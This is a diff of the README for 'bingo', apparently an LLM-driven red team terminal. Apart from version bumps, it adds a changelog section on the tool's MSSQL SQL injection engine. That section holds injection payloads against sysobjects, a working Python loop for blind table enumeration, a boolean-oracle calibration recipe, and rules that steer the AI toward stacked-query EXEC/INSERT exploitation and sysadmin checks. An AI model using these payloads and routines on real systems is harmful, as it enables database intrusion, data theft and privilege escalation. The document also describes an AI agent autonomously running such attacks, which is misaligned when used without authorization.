@@ -6,7 +6,7 @@
 
 **AI-Powered Red Team Terminal**
 
-[![Version](https://img.shields.io/badge/version-2.3.21-brightgreen?logo=github)](https://github.com/bingook/bingo/releases)
+[![Version](https://img.shields.io/badge/version-2.3.22-brightgreen?logo=github)](https://github.com/bingook/bingo/releases)
 [![Python](https://img.shields.io/badge/python-3.10%2B-blue?logo=python&logoColor=white)](https://python.org)
 [![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
 [![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/bingook/bingo)
@@ -14,8 +14,8 @@
 
 *DeepSeek · Claude · GPT · GLM · Qwen · Ollama · Custom*
 
-> **v2.3.5 — Official Release**  
-> Previous versions (≤ 2.0.x) were test/beta releases. v2.3.5 is the latest stable, production-ready version.
+> **v2.3.22 — Official Release**  
+> Previous versions (≤ 2.0.x) were test/beta releases. v2.3.22 is the latest stable, production-ready version.
 
 </div>
 
@@ -5146,6 +5146,77 @@ commonly found in real-world assessments.
 
 No user configuration needed — everything is automatic and controlled by the
 tech-stack fingerprint detected in Step 1.
+
+---
+
+## SQLi Enumeration Engine Fixes (v2.3.22)
+
+Analysis of real penetration test logs (MSSQL target, ASP Classic) revealed 5 new critical bugs in the SQL injection enumeration loop — all fixed.
+
+### Fixes Applied
+
+| # | Category | Problem | Fix |
+|---|----------|---------|-----|
+| 1 | **🔴 Critical Bug** | `SELECT TOP 1 name ... LIKE 'A%'` without cursor always returns the same first row → **infinite loop** printing the same table 100+ times | System prompt: mandatory cursor pagination (`AND name > {last_hex}`) + `seen=set()` dedup |
+| 2 | **🔴 Critical Bug** | No deduplication logic — script never checks if a result was already seen | System prompt: `seen = set()` mandatory in all enumeration loops; break immediately on duplicate |
+| 3 | **🔴 Critical Bug** | `NOT IN (hex...)` bypassed by WAF or hex malformed → same table returned 27 times | System prompt: if same result 2+ times, switch to `AND name > {cursor}` pagination instead |
+| 4 | **🟡 Important** | `ADODB.Recordset 800a0cc1` error misidentified as failure — actually proves stacked queries execute | Runtime detector in `terminal.py`: now signals "stacked query opportunity", guides AI to use `EXEC`/`INSERT` not `SELECT` |
+| 5 | **🟡 Important** | `IS_SRVROLEMEMBER` check returned ambiguous result, left unresolved | System prompt: alternative sysadmin checks (`SELECT SYSTEM_USER`, `sysprocesses loginame`) |
+| 6 | **🟡 Important** | Boolean oracle: TRUE response ≠ baseline size (dynamic content) → oracle calibration skipped | System prompt: mandatory 3-step calibration (TRUE/FALSE/baseline) before any data extraction |
+
+### New Runtime Detectors (terminal.py)
+
+**ADODB 800a0cc1 — Stacked Query Signal:**
+```
+⚡ ADODB 800a0cc1 detected — semicolon stacked query IS executing!
+NEXT: Use EXEC/INSERT (side-effect queries), not SELECT (causes recordset error)
+```
+
+**Infinite Loop Guard:**
+```
+🔁 Infinite loop warning: 'TABLE_NAME' repeating — dedup + pagination required!
+Mandatory fix: cursor pagination pattern with seen=set() provided
+```
+
+### Table Enumeration Pagination (New Rule)
+
+**Wrong (causes infinite loop):**
+```python
+for i in range(100):
+    result = query("SELECT TOP 1 name FROM sysobjects WHERE name LIKE 'A%'")
+    print(result)  # prints SAME_TABLE 100 times!
+```
+
+**Correct (cursor pagination):**
+```python
+seen = set()
+last_hex = ''
+while True:
+    if last_hex:
+        payload = f"AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55 AND name > {last_hex})"
+    else:
+        payload = "AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55)"
+    result = extract(payload)
+    if not result or result in seen:
+        break  # EXIT on duplicate or empty
+    seen.add(result)
+    last_hex = '0x' + result.encode().hex().upper()
+    print(result)
+```
+
+### Boolean Oracle Calibration (New Rule)
+
+Before extracting data, bingo now mandates 3-step oracle validation:
+
+```
+Step 1: AND(1)=(1) → TRUE_SIZE
+Step 2: AND(1)=(2) → FALSE_SIZE  
+Step 3: normal param → BASE_SIZE
+
+VALID oracle: TRUE_SIZE ≠ FALSE_SIZE (diff > 100B)
+INVERTED oracle: if TRUE_SIZE == BASE_SIZE → flip condition logic
+INVALID oracle: if TRUE_SIZE == FALSE_SIZE → find different injection point
+```
 
 ---
 
